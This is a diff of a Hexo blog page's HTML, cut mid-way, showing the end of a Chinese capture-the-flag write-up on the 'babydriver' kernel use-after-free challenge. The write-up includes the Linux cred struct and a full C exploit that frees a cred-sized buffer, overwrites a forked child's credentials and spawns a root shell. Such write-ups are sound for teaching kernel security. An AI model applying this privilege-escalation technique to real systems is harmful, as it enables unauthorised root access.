class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">struct cred {
+    atomic_t    usage;
+#ifdef CONFIG_DEBUG_CREDENTIALS
+    atomic_t    subscribers;    /* number of processes subscribed */
+    void        *put_addr;
+    unsigned    magic;
+#define CRED_MAGIC    0x43736564
+#define CRED_MAGIC_DEAD    0x44656144
+#endif
+    kuid_t        uid;        /* real UID of the task */
+    kgid_t        gid;        /* real GID of the task */
+    kuid_t        suid;        /* saved UID of the task */
+    kgid_t        sgid;        /* saved GID of the task */
+    kuid_t        euid;        /* effective UID of the task */
+    kgid_t        egid;        /* effective GID of the task */
+    kuid_t        fsuid;        /* UID for VFS ops */
+    kgid_t        fsgid;        /* GID for VFS ops */
+    unsigned    securebits;    /* SUID-less security management */
+    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
+    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */
+    kernel_cap_t    cap_effective;    /* caps we can actually use */
+    kernel_cap_t    cap_bset;    /* capability bounding set */
+    kernel_cap_t    cap_ambient;    /* Ambient capability set */
+#ifdef CONFIG_KEYS
+    unsigned char    jit_keyring;    /* default keyring to attach requested
+                     * keys to */
+    struct key __rcu *session_keyring; /* keyring inherited over fork */
+    struct key    *process_keyring; /* keyring private to this process */
+    struct key    *thread_keyring; /* keyring private to this thread */
+    struct key    *request_key_auth; /* assumed request_key authority */
+#endif
+#ifdef CONFIG_SECURITY
+    void        *security;    /* subjective LSM security */
+#endif
+    struct user_struct *user;    /* real user ID subscription */
+    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
+    struct group_info *group_info;    /* supplementary groups for euid/fsgid */
+    struct rcu_head    rcu;        /* RCU deletion hook */
+};
+</code></pre>
 <p>exp：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">	close(fd1);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> buf[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2,buf,<span class="number">28</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"you are root now"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stropts.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main()
+{
+    int fd1 = open(&quot;/dev/babydev&quot;,2);
+    int fd2 = open(&quot;/dev/babydev&quot;,2);
+
+    ioctl(fd1,0x10001,0xa8);
+
+    close(fd1);
+
+    int pid = fork();
+
+    if(pid &lt; 0)
+    {
+        puts(&quot;[*] fork error!&quot;);
+        exit(0);
+    }
+
+    else if (pid == 0)
+    {
+        int buf[20]={0};
+        write(fd2,buf,28);
+        system(&quot;/bin/sh&quot;);
+        puts(&quot;you are root now&quot;);
+    }
+
+    else
+    {
+        wait(NULL);
+    }
+
+    return 0;
+
+}
+</code></pre>
 <p>静态编译exp，然后将得到的二进制文件放入解压的文件夹下，重新打包系统</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; rootfs.cpio</span><br></pre></td></tr></table></figure>
-<p>启动系统，运行exp,获取root权限</p>
-<p><img src="/picture/1550221693129.png" alt="1550221693129"></p>
+<pre><code>find . | cpio -o --format=newc &gt; rootfs.cpio
+</code></pre><p>启动系统，运行exp,获取root权限</p>
+<p><img src="/picture/1550221693129.png" srcset="/img/loading.gif" alt="1550221693129"></p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-      <div>
-        
-
-
-
-
-  
-
-
-
-<ul class="post-copyright">
-  <li class="post-copyright-author">
-    <strong>本文作者： </strong>zs0zrc</li>
-  <li class="post-copyright-link">
-    <strong>本文链接：</strong>
-    
-    <a href="http://yoursite.com/2019/02/15/2019-2-15-kernel-UAF/" title="【kernel-UAF】babydriver">http://yoursite.com/2019/02/15/2019-2-15-kernel-UAF/</a>
-  </li>
-  <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
-</ul>
-
-      </div>
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-            <a href="/tags/kernel/" rel="tag"># kernel</a>
-          
-        </div>
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2019/01/31/2019-1-31-kernel_pwn入门之环境搭建/" rel="next" title="kernel_pwn入门之环境搭建">
-                <i class="fa fa-chevron-left"></i> kernel_pwn入门之环境搭建
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/08/2018-9-30-堆利用的总结/" rel="prev" title="堆利用的一些总结">
-                堆利用的一些总结 <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="zs0zrc">
-            
-              <p class="site-author-name" itemprop="name">zs0zrc</p>
-              <div class="site-description motion-element" itemprop="description">zs0zrc's blog</div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            </div>
+            <hr>
+            <div>
+              <p>
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">53</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Linux-Kernel/">Linux_Kernel</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
+                  <span>
+                <i class="iconfont icon-tag"></i>
                     
-                      <a href="/categories/">
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
                     
-                  
+                      <a class="hover-with-bg" href="/tags/kernel/">kernel</a>
                     
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">13</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                  </span>
                 
-                
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
+              </p>
               
-            </nav>
-          
-
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://github.com/zszcr" title="GitHub &rarr; https://github.com/zszcr" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-                </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="https://twitter.com/1PFjclRQBHRAuEE" title="Twitter &rarr; https://twitter.com/1PFjclRQBHRAuEE" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
-                </span>
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
               
             </div>
-          
 
-          
-             <div class="cc-license motion-element" itemprop="license">
-              
-              
-                
-              
-              
-              
-              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
-             </div>
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-block">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://23r3f.github.io/" title="https://23r3f.github.io/" rel="noopener" target="_blank">23R3F</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://myhackerworld.top/" title="http://myhackerworld.top/" rel="noopener" target="_blank">D4rk3r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://m4x.fun/" title="http://m4x.fun/" rel="noopener" target="_blank">M4X</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://n132.github.io/" title="https://n132.github.io/" rel="noopener" target="_blank">n13r</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://aluvion.github.io/" title="https://aluvion.github.io/" rel="noopener" target="_blank">Twings</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://littleredlie.github.io/" title="https://littleredlie.github.io/" rel="noopener" target="_blank">LittleRed</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://glarcy.github.io/" title="https://glarcy.github.io/" rel="noopener" target="_blank">Glarcy</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
             
-          
-          
-
+          </div>
         </div>
       </div>
-
-      
-
-      
-
     </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">zs0zrc</span>
-
-  
-
-  
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
 </div>
 
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.1.0</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
       </div>
     
+  </div>
+</div>
+
+<!-- Custom -->
+
 
     
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
 
     
 
     
   </div>
+</footer>
 
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+  <script src="/js/lazyload.js"></script>
 
 
 
   
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
 
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
 
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/utils.js?v=7.1.0"></script>
-
-  <script src="/js/motion.js?v=7.1.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/affix.js?v=7.1.0"></script>
-
-  <script src="/js/schemes/pisces.js?v=7.1.0"></script>
-
-
-
-  
-  <script src="/js/scrollspy.js?v=7.1.0"></script>
-<script src="/js/post-details.js?v=7.1.0"></script>
-
-
-
-  
-
-
-  <script src="/js/next-boot.js?v=7.1.0"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
-  
 
-  
 
-  
 
-  
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
-  
 
-  
 
-  
 
-  
+<!-- Plugins -->
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  
 
-  
 
-  
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "【kernel-UAF】babydriver&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
 
 </body>
 </html>
